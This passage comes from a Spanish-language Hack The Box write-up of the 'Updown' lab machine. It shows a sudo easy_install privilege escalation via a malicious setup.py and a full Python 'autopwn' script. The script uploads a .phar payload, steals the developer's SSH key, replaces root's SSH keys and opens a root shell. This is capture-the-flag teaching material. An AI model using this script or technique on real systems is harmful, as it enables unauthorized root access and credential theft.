    <span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">script</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="s">'exec'</span><span class="p">)</span>
    <span class="k">exec</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="nb">globals</span><span class="p">,</span> <span class="nb">locals</span><span class="p">)</span> <span class="c1"># &lt;-- Execution!
</span></pre></table></code></div></div><p>Y finalmente, se lee el contenido y se compila el código de nuestro archivo <code class="language-plaintext highlighter-rouge">setup.py</code> para luego estar listo para ejecutarse con <code class="language-plaintext highlighter-rouge">exec()</code> y con ello tener una <strong>Execución Remota de Comandos</strong></p><p>Ahora lo que tenemos que hacer es crear una carpeta de trabajo y dentro nuestro archivo <code class="language-plaintext highlighter-rouge">setup.py</code> con el código para ejecutar comandos. Luego usar la herramienta <code class="language-plaintext highlighter-rouge">easy_install</code> (que ejecutaremos como root) para intentar construir e instalar un “supuesto paquete” que se encuentra en nuestra carpeta de trabajo que posteriormente procederá a ejecutar nuestro código:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">developer@updown:/tmp/.privesc/RCE$</span><span class="w"> </span><span class="nb">cat </span>setup.py 
<span class="go">__import__('os').system('id')
</span><span class="gp">developer@updown:/tmp/.privesc/RCE$</span><span class="w"> </span><span class="nb">sudo</span> /usr/local/bin/easy_install <span class="nb">.</span>
<span class="go">WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing .
Writing /tmp/.privesc/RCE/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/.privesc/RCE/egg-dist-tmp-7uz3eh
uid=0(root) gid=0(root) groups=0(root) &lt;--- Successful RCE!
No eggs found in /tmp/.privesc/RCE/egg-dist-tmp-7uz3eh (setup script problem?)
</span></pre></table></code></div></div><p>Para finalizar y aplicar todo el proceso otra vez, hice un <strong>Autopwn</strong> en <code class="language-plaintext highlighter-rouge">python</code> que nos devuelve una shell para ejecutar comandos:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="s">"""
Autopwn Updown HTB Machine
--------------------------
Author: Marss
Date: Oct 21, 2022
"""</span>

<span class="kn">import</span> <span class="nn">paramiko</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Ctrl + c (function)
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] User terminated.'</span><span class="p">)</span>

<span class="c1"># Ctrl + c (signal)
</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># Main class
</span><span class="k">class</span> <span class="nc">Exploit</span><span class="p">:</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">target_url</span> <span class="o">=</span> <span class="s">'http://dev.siteisup.htb'</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">malicious_file</span> <span class="o">=</span> <span class="s">'remote_code_execution.phar'</span>

	<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">progress</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Starting attack'</span><span class="p">)</span>

		<span class="c1"># (1) UPLOAD FILE 
</span>		<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Uploading file'</span><span class="p">)</span>

		<span class="n">upload_file_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">upload_file</span><span class="p">)</span>
		<span class="n">upload_file_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
		
		<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># wait until the file has been uploaded
</span>		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'File Uploaded: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">malicious_file</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

		<span class="c1"># (2) EXECUTE FILE
</span>		<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Executing file'</span><span class="p">)</span>
		
		<span class="n">id_rsa_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_file</span><span class="p">()</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'Payload executed'</span><span class="p">)</span>

		<span class="c1"># (3) SAVE DEVELOPER ID_RSA
</span>		<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Extracting id_rsa keys'</span><span class="p">)</span>

		<span class="n">private_key_name</span> <span class="o">=</span> <span class="s">'id_rsa_developer'</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">create_file</span><span class="p">(</span><span class="n">private_key_name</span><span class="p">,</span> <span class="n">id_rsa_output</span><span class="p">)</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'Developer id_rsa: ./</span><span class="si">{</span><span class="n">private_key_name</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

		<span class="c1"># (4) SSH CONNECTION (developer)
</span>		<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'SSH connection'</span><span class="p">)</span>
		<span class="n">connection</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">ssh_connection</span><span class="p">(</span><span class="s">'developer'</span><span class="p">,</span> <span class="n">private_key_name</span><span class="p">)</span>

		<span class="c1"># (5) GET ROOT SHELL WITH ROOT ID_RSA
</span>		<span class="n">progress</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'Getting reverse shell'</span><span class="p">)</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">interactive_shell</span><span class="p">(</span><span class="n">connection</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">create_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">file_name</span><span class="p">,</span> <span class="n">file_data</span><span class="p">):</span>
		<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
			<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">file_data</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
				<span class="s">'Special-Dev'</span> <span class="p">:</span> <span class="s">'only4dev'</span>
			<span class="p">}</span>

			<span class="n">file_data</span> <span class="o">=</span> <span class="p">{</span>
				<span class="s">'file'</span> <span class="p">:</span> <span class="p">(</span>
					<span class="bp">self</span><span class="p">.</span><span class="n">malicious_file</span><span class="p">,</span> 
					<span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">malicious_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">),</span> 
					<span class="s">'application/octet-stream'</span>
				<span class="p">)</span>
			<span class="p">}</span>

			<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
				<span class="s">'check'</span> <span class="p">:</span> <span class="s">'Check'</span>
			<span class="p">}</span>

			<span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
				<span class="bp">self</span><span class="p">.</span><span class="n">target_url</span><span class="p">,</span> 
				<span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> 
				<span class="n">files</span><span class="o">=</span><span class="n">file_data</span><span class="p">,</span> 
				<span class="n">data</span><span class="o">=</span><span class="n">post_data</span>
			<span class="p">)</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">output_command</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
		<span class="n">output</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">http://url.fake</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
		<span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"Enter URL here:Welcome to 'siteisup.htb' application"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>

		<span class="k">return</span> <span class="n">output</span>
		
	<span class="k">def</span> <span class="nf">execute_file</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
				<span class="s">'Special-Dev'</span> <span class="p">:</span> <span class="s">'only4dev'</span>
			<span class="p">}</span>

			<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_url</span> <span class="o">+</span> <span class="s">'/uploads/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
			
			<span class="n">beauty_response</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
			<span class="n">md5_directories</span> <span class="o">=</span> <span class="n">beauty_response</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'a'</span><span class="p">)[</span><span class="mi">5</span><span class="p">:]</span>

			<span class="k">for</span> <span class="n">md5_directory</span> <span class="ow">in</span> <span class="n">md5_directories</span><span class="p">:</span>
				<span class="n">upload_url</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">target_url</span> <span class="o">+</span> <span class="sa">f</span><span class="s">'/uploads/</span><span class="si">{</span><span class="n">md5_directory</span><span class="p">.</span><span class="n">string</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">malicious_file</span><span class="si">}</span><span class="s">'</span>
				
				<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

				<span class="k">if</span> <span class="s">'Not Found'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
					<span class="k">continue</span>
				<span class="k">break</span>

			<span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">output_command</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">interactive_shell</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">connection</span><span class="p">):</span>
		<span class="n">command</span> <span class="o">=</span> <span class="s">"mkdir /tmp/.privesc"</span>
		<span class="n">_</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>

		<span class="n">command</span> <span class="o">=</span> <span class="s">"echo </span><span class="se">\"</span><span class="s">__import__('os').system('rm /root/.ssh/id_rsa*')</span><span class="se">\"</span><span class="s"> &gt; /tmp/.privesc/setup.py"</span>
		<span class="n">_</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>

		<span class="n">command</span> <span class="o">=</span> <span class="s">"echo </span><span class="se">\"</span><span class="s">__import__('os').system('ssh-keygen -q -t rsa -f /root/.ssh/id_rsa -N </span><span class="se">\\\"\\\"</span><span class="s">')</span><span class="se">\"</span><span class="s"> &gt;&gt; /tmp/.privesc/setup.py"</span>
		<span class="n">_</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>

		<span class="n">command</span> <span class="o">=</span> <span class="s">"echo </span><span class="se">\"</span><span class="s">__import__('os').system('cat /root/.ssh/id_rsa.pub &gt; /root/.ssh/authorized_keys &amp;&amp; cat /root/.ssh/id_rsa')</span><span class="se">\"</span><span class="s"> &gt;&gt; /tmp/.privesc/setup.py"</span>		
		<span class="n">_</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
		
		<span class="n">command</span> <span class="o">=</span> <span class="s">"sudo /usr/local/bin/easy_install -q /tmp/.privesc 2&gt;/dev/null"</span>
		<span class="n">id_rsa_output</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>

		<span class="n">private_key_name</span> <span class="o">=</span> <span class="s">'id_rsa_root'</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">create_file</span><span class="p">(</span><span class="n">private_key_name</span><span class="p">,</span> <span class="n">id_rsa_output</span><span class="p">)</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'Root id_rsa: ./</span><span class="si">{</span><span class="n">private_key_name</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
		
		<span class="n">root_client</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">ssh_connection</span><span class="p">(</span><span class="s">'root'</span><span class="p">,</span> <span class="n">private_key_name</span><span class="p">)</span>
		<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Successful ssh connection'</span><span class="p">)</span>

		<span class="n">_</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">root_client</span><span class="p">,</span> <span class="s">'rm -r /tmp/.privesc'</span><span class="p">)</span>
		
		<span class="k">print</span><span class="p">()</span>
		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
			<span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'~# '</span><span class="p">)</span>
			<span class="n">output_command</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">root_client</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
			<span class="k">print</span><span class="p">(</span><span class="n">output_command</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">connection</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
		<span class="n">_stdin</span><span class="p">,</span> <span class="n">_stdout</span><span class="p">,</span> <span class="n">_stderr</span> <span class="o">=</span> <span class="n">connection</span><span class="p">.</span><span class="n">exec_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
		<span class="n">output_command</span> <span class="o">=</span> <span class="n">_stdout</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
		
		<span class="k">return</span> <span class="n">output_command</span>

	<span class="k">def</span> <span class="nf">ssh_connection</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ssh_username</span><span class="p">,</span> <span class="n">private_key_name</span><span class="p">):</span>
		<span class="n">target_host</span> <span class="o">=</span> <span class="s">'10.10.11.177'</span>
		<span class="n">ssh_private_key</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">RSAKey</span><span class="p">.</span><span class="n">from_private_key_file</span><span class="p">(</span><span class="sa">f</span><span class="s">"./</span><span class="si">{</span><span class="n">private_key_name</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

		<span class="k">try</span><span class="p">:</span>
			<span class="n">client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">SSHClient</span><span class="p">()</span>
			<span class="n">client</span><span class="p">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>

			<span class="n">client</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">target_host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">ssh_username</span><span class="p">,</span> <span class="n">pkey</span><span class="o">=</span><span class="n">ssh_private_key</span><span class="p">)</span>

			<span class="k">return</span> <span class="n">client</span>

		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
			<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[x] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>

<span class="c1"># Main flow
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">ascii_tittle</span> <span class="o">=</span> <span class="s">"""
         _, _,_ ___  _, __, _  _ _, _   _,_ __, __,  _, _  _ _, _
        /_\ | |  |  / \ |_) |  | |\ |   | | |_) | \ / \ |  | |\ |
        | | | |  |  \ / |   |/\| | \|   | | |   |_/ \ / |/\| | \|
        ~ ~ `~'  ~   ~  ~   ~  ~ ~  ~   `~' ~   ~    ~  ~  ~ ~  ~
                                                            by marss
 	"""</span>
	
	<span class="k">print</span><span class="p">(</span><span class="n">ascii_tittle</span><span class="p">)</span>

	<span class="n">exploit</span> <span class="o">=</span> <span class="n">Exploit</span><span class="p">()</span>
	
	<span class="n">exploit</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</pre></table></code></div></div><p>Ahora solo lo ejecutamos y conseguimos la flag:</p><p><img data-src="/assets/img/htb/writeups/updown/autopwn.png" alt="Autopwn" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio: <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Updown">https://github.com/E1P0TR0</a></p></div></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/git/" class="post-tag no-text-decoration" >Git</a> <a href="/tags/python/" class="post-tag no-text-decoration" >Python</a> <a href="/tags/php/" class="post-tag no-text-decoration" >Php</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Updown - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBUpdown/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Updown - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBUpdown/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBUpdown/&amp;text=Hackthebox Writeup Updown - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBUndetected/"><div class="card-body"> <em class="timeago small" data-ts="1650704859" > 2022-04-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Undetected</h3><div class="text-muted small"><p> Máquina Linux donde enumeramos por TCP para hallar un subdominio que al aplicar Directory Fuzzing encontramos una ruta vulnerable del framework PHPUnit que nos permitía Remote Code Execution (RCE) ...</p></div></div></a></div><div class="card"> <a href="/posts/HTBNoter/"><div class="card-body"> <em class="timeago small" data-ts="1657962497" > 2022-07-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Noter</h3><div class="text-muted small"><p> Overview: User validation by Error Messages in Login process. Brute force default Flask’s Session Management. User passwords, Backup code, database credentials by Information Leakage. Rem...</p></div></div></a></div><div class="card"> <a href="/posts/HTBShared/"><div class="card-body"> <em class="timeago small" data-ts="1660598471" > 2022-08-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Shared</h3><div class="text-muted small"><p> Overview: Database enumeration and SSH password leak by SQL Inyection Remote command execution in IPython (CVE-2022-21699) (Foothold) Redis password leak exploiting a connection binary Re...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBShoppy/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Shoppy</p></a> <a href="/posts/HTBPhotobomb/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Photobomb</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script 